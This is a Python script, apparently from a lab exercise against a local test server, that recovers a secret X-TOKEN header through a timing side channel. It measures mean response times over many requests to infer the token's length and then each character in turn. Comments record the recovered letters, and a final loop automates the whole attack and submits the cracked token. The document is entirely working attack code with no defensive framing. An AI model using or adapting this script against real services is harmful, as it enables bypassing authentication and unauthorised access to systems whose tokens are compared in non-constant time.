import requests
import time as t
import statistics as stat


url = "http://localhost:8000"
chars = list(map(chr, range(97, 123)))     # generate a list of lowercase chars
# print (list(chars))

resp = requests.get(url)
print(resp)

resp_time = requests.get(url).elapsed.total_seconds()
print(resp_time)

"""

for i in range(10):
	mytoken="A"*i
	time=requests.get (url, headers={"X-TOKEN":mytoken}).elapsed.total_seconds()
	print (len(mytoken),":",time)

#print(chr (97))
#print (type(time))




#timer1=[]
#timer= arr.array('f', [])

This is to guess the len of token.  
for i in range(13):
	timer1=[]
	mytoken="a"*i
	for j in range (1000):	
		time=requests.get (url, headers={"X-TOKEN":mytoken}).elapsed.total_seconds()
		timer1.append(time)
		#t.sleep(0.01)
	print (len(mytoken),":mean=",stat.mean(timer1))


# guess the first char of the token

for char in chars:
	timer1=[]
	mytoken=char*6
	for j in range (1000):	
		time=requests.get (url, headers={"X-TOKEN":mytoken}).elapsed.total_seconds()
		timer1.append(time)
		#t.sleep(0.01)
	print (char,":mean=",stat.mean(timer1)) # f is taking the longest time to respond
# guess the first and second char of the token

for char in chars:
	timer1=[]
	mytoken='f' + char*5
	for j in range (1000):	
		time=requests.get (url, headers={"X-TOKEN":mytoken}).elapsed.total_seconds()
		timer1.append(time)
		#t.sleep(0.01)
	print (mytoken,":mean=",stat.mean(timer1)) # o is taking the longest time to respond


# guess the first, second and third char of the token

for char in chars:
	timer1=[]
	mytoken='f' + 'o' + char*4
	for j in range (100):	# reduce to hundred as it getting slower
		time=requests.get (url, headers={"X-TOKEN":mytoken}).elapsed.total_seconds()
		timer1.append(time)
		#t.sleep(0.01)
	print (mytoken,":mean=",stat.mean(timer1)) # o is taking the longest time to respond

# guess the first, second, third  and forth char of the token

for char in chars:
	timer1=[]
	mytoken='f' + 'o' + 'o' + char*3
	for j in range (10):	# reduce to ten as it getting slower
		time=requests.get (url, headers={"X-TOKEN":mytoken}).elapsed.total_seconds()
		timer1.append(time)
	print (mytoken,":mean=",stat.mean(timer1)) # b is taking the longest time to respond
# guess the first, second, third , forth, fifth char of the token

for char in chars:
	timer1=[]
	mytoken='f' + 'o' + 'o' +'b'+ char*2
	for j in range (10):	# reduce to ten as it getting slower
		time=requests.get (url, headers={"X-TOKEN":mytoken}).elapsed.total_seconds()
		timer1.append(time)
	print (mytoken,":mean=",stat.mean(timer1)) # a is taking the longest time to respond

# guess the first, second, third , forth, fifth and sixth char of the token

goodchar = ""
max_mean: float = 0.0
for char in chars:
	timer1=[]
	mytoken='f' + 'o' + 'o' +'b'+ 'a' + char
	for j in range (10):	# reduce to ten as it getting slower
		time=requests.get (url, headers={"X-TOKEN":mytoken}).elapsed.total_seconds()
		timer1.append(time)
	if stat.mean(timer1) > max_mean:
		goodchar=char
		max_mean = stat.mean(timer1)
print (goodchar,":mean=",max_mean) # r is taking the longest time to respond

"""
# loop a token size of six
token_size=6
goodchars=[]
goodchar=""
mytoken=""
timer1 = []
for i in range(0,token_size):
	#print (i)
	goodchar = ""
	max_mean: float = 0.0
	for char in chars:       # try a list of lowercase chars
		timer1=[]
		str1=''.join(goodchars)   # convert a list of goodchars to str1
		mytoken = str1 + char *(token_size-i)
		print(mytoken)
		for j in range (10):	# reduce to ten as it getting slower to get mean response time
			time=requests.get (url, headers={"X-TOKEN":mytoken}).elapsed.total_seconds()
			timer1.append(time)
		if stat.mean(timer1) > max_mean:
			goodchar=char
			max_mean = stat.mean(timer1)
	goodchars.append(goodchar)
	#print (goodchar,":mean=",max_mean) # print char of which taking the longest time to respond
#print (list(goodchars))
cracked_token =''.join(goodchars)
print(cracked_token)
success_resp=requests.get (url, headers={"X-TOKEN":cracked_token})
success_resp_time = requests.get (url, headers={"X-TOKEN":cracked_token}).elapsed.total_seconds()
print(success_resp)
print(success_resp_time)